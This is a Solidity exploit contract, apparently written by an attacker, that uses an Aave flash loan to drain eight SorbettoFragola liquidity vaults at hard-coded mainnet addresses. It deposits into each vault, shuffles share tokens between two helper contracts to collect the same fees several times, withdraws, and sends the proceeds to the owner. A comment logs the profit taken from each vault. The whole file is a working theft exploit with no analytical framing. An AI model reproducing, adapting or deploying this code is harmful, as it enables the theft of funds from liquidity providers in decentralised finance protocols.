pragma solidity ^0.6.0;

//author: r4v3n


import "../node_modules/@openzeppelin/contracts/token/ERC20/SafeERC20.sol";

interface ILendingPool {
  function flashLoan(
    address receiverAddress,
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode
  ) external;
}
interface ISorbettoFragola {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function deposit(uint256 amount0Desired, uint256 amount1Desired) external payable returns (uint256 shares, uint256 amount0,uint256 amount1);
    function collectFees(uint256 amount0, uint256 amount1) external;
    function withdraw(uint256 shares) external returns (uint256 amount0, uint256 amount1);
    function userInfo(address) external view returns (uint, uint, uint, uint);
    function totalSupply() external view returns (uint256);
    function position() external view returns (uint128 liquidity, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, uint128 tokensOwed0, uint128 tokensOwed1);
}

interface IUniswapV2Router01 {
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
}


contract Lib {
    using SafeERC20 for IERC20;

    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function collectFees(address victim, uint amount0, uint amount1) public {
        require(msg.sender == owner, "Not your biz!");

        ISorbettoFragola(victim).collectFees(amount0, amount1);

        //collect profit
        address token0 = ISorbettoFragola(victim).token0();
        address token1 = ISorbettoFragola(victim).token1();
        IERC20(token0).safeTransfer(owner, IERC20(token0).balanceOf(address(this)));
        IERC20(token1).safeTransfer(owner, IERC20(token1).balanceOf(address(this)));
    }

    function transferTokens(address victim, address _to, uint _value) public {
        require(msg.sender == owner, "Not your biz!");

        IERC20(victim).transfer(_to, _value);
    }
}

contract Exp {
    using SafeERC20 for IERC20;

    address owner;

    address constant aaveLendingPoolV2 = address(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address constant sushiswap = address(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    address constant plpWethUsdt = address(0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48);
    address constant plpUsdcWeth = address(0xd63b340F6e9CCcF0c997c83C8d036fa53B113546);
    address constant plpWbtcWeth = address(0x0A8143EF65b0CE4C2fAD195165ef13772ff6Cca0);
    address constant plpWethUsdt2 = address(0x98d149e227C75D38F623A9aa9F030fB222B3FAa3);
    address constant plpWbtcUsdc = address(0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7);
    address constant plpUsdcWeth2 = address(0x6f3F35a268B3af45331471EABF3F9881b601F5aA);
    address constant plpDaiWeth = address(0xDD90112eAF865E4E0030000803ebBb4d84F14617);
    address constant plpUniWeth = address(0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35);

    address constant USDT = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address constant WBTC = address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    address constant USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant DAI = address(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    address constant UNI = address(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);

    Lib lib1;
    Lib lib2;


    constructor() public {
        owner = msg.sender;
        lib1 = new Lib();
        lib2 = new Lib();
    }

    function trigger() public {
        require(msg.sender == owner, "Not your biz!");

        address[] memory assets = new address[](6);
        assets[0] = USDT;
        assets[1] = WETH;
        assets[2] = WBTC;
        assets[3] = USDC;
        assets[4] = DAI;
        assets[5] = UNI;

        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 30000000000000;
        amounts[1] = 13000000000000000000000;
        amounts[2] = 140000000000;
        amounts[3] = 30000000000000;
        amounts[4] = 3000000000000000000000000;
        amounts[5] = 200000000000000000000000;

        uint256[] memory modes = new uint256[](6);

        

        ILendingPool(aaveLendingPoolV2).flashLoan(address(this), assets, amounts, modes, address(this), "", 0);


        //collect profit
        for ( uint i=0 ; i<assets.length ; i++ ) {
            IERC20(assets[i]).safeTransfer(owner, IERC20(assets[i]).balanceOf(address(this)));
            
        }
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        
        
        shellcode(plpWethUsdt, amounts[1], amounts[0]);        
        shellcode(plpUsdcWeth, amounts[3], amounts[1]);       
        shellcode(plpWbtcWeth, amounts[2], amounts[1]);
        shellcode(plpWethUsdt2, amounts[1], amounts[0]);
        shellcode(plpWbtcUsdc, amounts[2], amounts[3]);
        shellcode(plpUsdcWeth2, amounts[3], amounts[1]);
        shellcode(plpDaiWeth, amounts[4], amounts[1]);
        shellcode(plpUniWeth, amounts[5], amounts[1]);

        /* Profit
        30000000000000,13084761850991056935808,140000000000,30000000000000,3000000000000000000000000,206810715663009752855363//uniweth   6810uni + 84eth = 560000u
        30000000000000,13000009622652369457258,140000000000,30000000000000,3000330778378101188907643,200000000000000000000000//daiweth   330dai + 0.01eth = 800u
        30000000000000,13000065169771355512335,140000000000,30000780068542,3000000000000000000000000,200000000000000000000000//usdcweth2 780u + 0.06eth = 3400u
        30000000000000,13000000000000000000000,140060656180,30000350023333,3000000000000000000000000,200000000000000000000000//wbtcusdc  0.6btc + 350u = 40000u
        30000118293307,13000051456792029427208,140000000000,30000000000000,3000000000000000000000000,200000000000000000000000//wethusdt2 0.05eth + 118u = 2400u
        30000000000000,13424654060390679405692,144891944083,30000000000000,3000000000000000000000000,200000000000000000000000//wbtcweth  48btc + 425eth = 5070000u
        30000000000000,13416249266232573978300,140000000000,32255427677756,3000000000000000000000000,200000000000000000000000//usdcweth  2255000u + 416eth = 4210000u
        34306537791077,13794659617573235952352,140000000000,30000000000000,3000000000000000000000000,200000000000000000000000//wethusdt  4306000u + 795eth = 8040000u
        */
        
        //test_balance(assets);

        // allowing aave to take back the flashloan'ed assets
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i] + premiums[i];
            IERC20(assets[i]).safeApprove(aaveLendingPoolV2, amountOwing);        
        
        }

        return true;
    }


    function test_balance(address[] calldata assets) internal returns(uint){
        uint balance_0 = IERC20(assets[0]).balanceOf(address(address(this)));
        uint balance_1 = IERC20(assets[1]).balanceOf(address(address(this)));
        uint balance_2 = IERC20(assets[2]).balanceOf(address(address(this)));
        uint balance_3 = IERC20(assets[3]).balanceOf(address(address(this)));
        uint balance_4 = IERC20(assets[4]).balanceOf(address(address(this)));
        uint balance_5 = IERC20(assets[5]).balanceOf(address(address(this)));
        require(false,string(abi.encodePacked(uintToString(balance_0), ",", uintToString(balance_1), ",", uintToString(balance_2), ",", uintToString(balance_3), ",", uintToString(balance_4), ",", uintToString(balance_5))));
        return 1;
    }

    function shellcode(address _victim, uint deposit0, uint deposit1) private {
        
        address token0 = ISorbettoFragola(_victim).token0();
        address token1 = ISorbettoFragola(_victim).token1();


        (uint shares_ , uint amount_0, uint amount_1 ) = getLiq(_victim, token0, token1, deposit0, deposit1);
        //revert("deposit done");

        
        
        // collectFees II
        
        (uint128 victim_liq,,,,) = ISorbettoFragola(_victim).position();
        (uint amount0, uint amount1, , ) = ISorbettoFragola(_victim).userInfo(address(lib1));

        uint shares = (amount1 * shares_ / amount_1) < (amount0 * shares_ / amount_0 )? (amount1 * shares_ / amount_1):(amount0 * shares_ / amount_0);

        uint balance0;
        uint balance1;

        if (victim_liq >= shares) {
            
            if(amount0 > 1e6 || amount1 > 1e6){
                lib1.collectFees(_victim, amount0, amount1);
            }
            
            balance0 = IERC20(token0).balanceOf(_victim);
            balance1 = IERC20(token1).balanceOf(_victim);
            (amount0, amount1, , ) = ISorbettoFragola(_victim).userInfo(address(lib1));
            amount0 = amount0< balance0 ? amount0: balance0;
            amount1 = amount1< balance1 ? amount1: balance1;

            if(amount0 > 1e6 || amount1 > 1e6){
                lib1.collectFees(_victim, amount0, amount1);
            }
            

        }else{

            if(amount_0 * victim_liq / shares_ > 1e6 || amount_1 * victim_liq / shares_ > 1e6){
                lib1.collectFees(_victim, amount_0 * victim_liq / shares_ , amount_1 * victim_liq / shares_ );
            }
            
            balance0 = IERC20(token0).balanceOf(_victim);
            balance1 = IERC20(token1).balanceOf(_victim);
            (amount0, amount1, , ) = ISorbettoFragola(_victim).userInfo(address(lib1));
            amount0 = amount0< balance0 ? amount0: balance0;
            amount1 = amount1< balance1 ? amount1: balance1;

            if(amount0 > 1e6 || amount1 > 1e6){
                lib1.collectFees(_victim, amount0, amount1);
            }

        }

        (victim_liq,,,,) = ISorbettoFragola(_victim).position();
        (amount0, amount1, , ) = ISorbettoFragola(_victim).userInfo(address(lib2));


        shares = (amount1 * shares_ / amount_1) < (amount0 * shares_ / amount_0 )? (amount1 * shares_ / amount_1):(amount0 * shares_ / amount_0);


        

        if (victim_liq >= shares) {
            
            if(amount0 > 1e6 || amount1 > 1e6){
                lib2.collectFees(_victim, amount0, amount1);
            }

            balance0 = IERC20(token0).balanceOf(_victim);
            balance1 = IERC20(token1).balanceOf(_victim);
            (amount0, amount1, , ) = ISorbettoFragola(_victim).userInfo(address(lib2));
            amount0 = amount0< balance0 ? amount0: balance0;
            amount1 = amount1< balance1 ? amount1: balance1;

            if(amount0 > 1e6 || amount1 > 1e6){
                lib2.collectFees(_victim, amount0, amount1);
            }

        }else{

            
            if(amount_0 * victim_liq / shares_ > 1e6 || amount_1 * victim_liq / shares_ > 1e6){
                lib2.collectFees(_victim, amount_0 * victim_liq / shares_ , amount_1 * victim_liq / shares_ );
            }

            balance0 = IERC20(token0).balanceOf(_victim);
            balance1 = IERC20(token1).balanceOf(_victim);
            (amount0, amount1, , ) = ISorbettoFragola(_victim).userInfo(address(lib2));
            amount0 = amount0< balance0 ? amount0: balance0;
            amount1 = amount1< balance1 ? amount1: balance1;

            if(amount0 > 1e6 || amount1 > 1e6){
                lib2.collectFees(_victim, amount0, amount1);
            }
            
        }

        

    }

    function getLiq(address _victim, address token0, address token1, uint deposit0, uint deposit1) internal returns(uint,uint,uint){

        (uint128 shares_s,,,,) = ISorbettoFragola(_victim).position();
        uint total_supply = ISorbettoFragola(_victim).totalSupply();
        // deposit
        IERC20(token0).safeApprove(_victim, deposit0);
        IERC20(token1).safeApprove(_victim, deposit1);
        (uint shares_mint, uint amount_0, uint amount_1 ) = ISorbettoFragola(_victim).deposit(deposit0, deposit1);
        //revert("deposit done");
       

        uint shares_ = shares_mint * shares_s / total_supply;

        IERC20(_victim).transfer(address(lib1), shares_mint);
        lib1.collectFees(_victim, 0, 0);
        lib1.transferTokens(_victim, address(lib2), shares_mint);
        lib2.collectFees(_victim, 0, 0);
        lib2.transferTokens(_victim, address(this), shares_mint);
               
        // withdraw
        ISorbettoFragola(_victim).withdraw(shares_mint);

        return(shares_, amount_0, amount_1);
    }

    function uintToString(uint v) pure internal returns (string memory) {
         uint maxlength = 78;
         bytes memory reversed = new bytes(maxlength);
         uint i = 0;
         while (v != 0) {
             uint remainder = v % 10;
             v = v / 10;
             reversed[i++] = byte(uint8(48 + remainder));
         }
         bytes memory s = new bytes(i);
         for (uint j = 0; j < i; j++) {
             s[j] = reversed[i - j - 1];
         }
         string memory str = string(s);
         return str;
     }
}
